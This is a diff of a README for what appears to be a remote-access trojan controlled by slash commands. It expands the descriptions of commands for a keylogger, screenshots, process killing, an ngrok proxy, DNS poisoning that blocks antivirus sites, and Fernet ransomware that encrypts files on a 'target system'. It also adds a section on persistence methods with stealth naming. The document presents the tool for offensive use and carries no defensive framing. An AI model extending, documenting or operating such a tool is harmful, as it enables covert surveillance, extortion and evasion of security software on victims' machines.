@@ -28,7 +28,13 @@
 - **Screenshot**: Take a screenshot of the target machine.
   - `/screenshot`
 - **File Management Commands**:
-  - `/cd`, `/pwd`, `/ls`, `/move`, `/copy`, `/delete`, `/mkdir`
+  - `/cd` - Change the current directory.
+  - `/pwd` - Display the current working directory.
+  - `/ls` - List files and directories in the current directory.
+  - `/move <SOURCE> <DESTINATION>` - Move or rename a file/directory.
+  - `/copy <SOURCE> <DESTINATION>` - Copy a file or directory.
+  - `/delete <PATH>` - Delete a file or directory.
+  - `/mkdir <DIRECTORY_NAME>` - Create a new directory.
 - **Process Management**:
   - `/ps` - List processes.
   - `/pskill <PID or PROCESS NAME>` - Kill a process.
@@ -55,16 +61,30 @@
 
 ### Other
 - **Keylogger**: Start or stop keylogging.
-  - `/start_keylogger`, `/stop_keylogger`
+  - `/start_keylogger` - Start keylogging.
+  - `/stop_keylogger` - Stop keylogging and retrieve logs.
 - **Proxy**: Host a proxy with ngrok.
-  - `/start_proxy`, `/stop_proxy`
+  - `/start_proxy` - Start a proxy using ngrok.
+  - `/stop_proxy` - Stop the active proxy.
 - **DNS Poisoner**: Block or unblock domains, including AV sites.
-  - `/block_av`, `/unblock_av`
-  - `/block_domain <DOMAIN>`, `/unblock_domain <DOMAIN>`
+  - `/block_av` - Block common antivirus domains.
+  - `/unblock_av` - Unblock common antivirus domains.
+  - `/block_domain <DOMAIN>` - Block a specific domain.
+  - `/unblock_domain <DOMAIN>` - Unblock a specific domain.
 - **Ransomware**: On demand encryption and decryption with Fernet.
-  - `/set_key <KEY>`, `/encrypt_files`, `/decrypt_files`
+  - `/set_key <KEY>` - Set the encryption key.
+  - `/encrypt_files` - Encrypt files in the target system.
+  - `/decrypt_files` - Decrypt files in the target system.
 
+---
 
+### Persistence
+- **List Methods**: View available persistence methods.
+  - `/list_persistence_methods` - List all supported persistence methods with descriptions.
+- **Apply Persistence**: Apply a specific persistence method.
+  - `/apply_persistence <METHOD> [STEALTH_NAME] [KEY_NAME]` - Apply persistence using the specified method.
+- **Help**: Get detailed help on a specific persistence method.
+  - `/persistence_help <METHOD>` - Show detailed help for a persistence method.
 
 ---
 
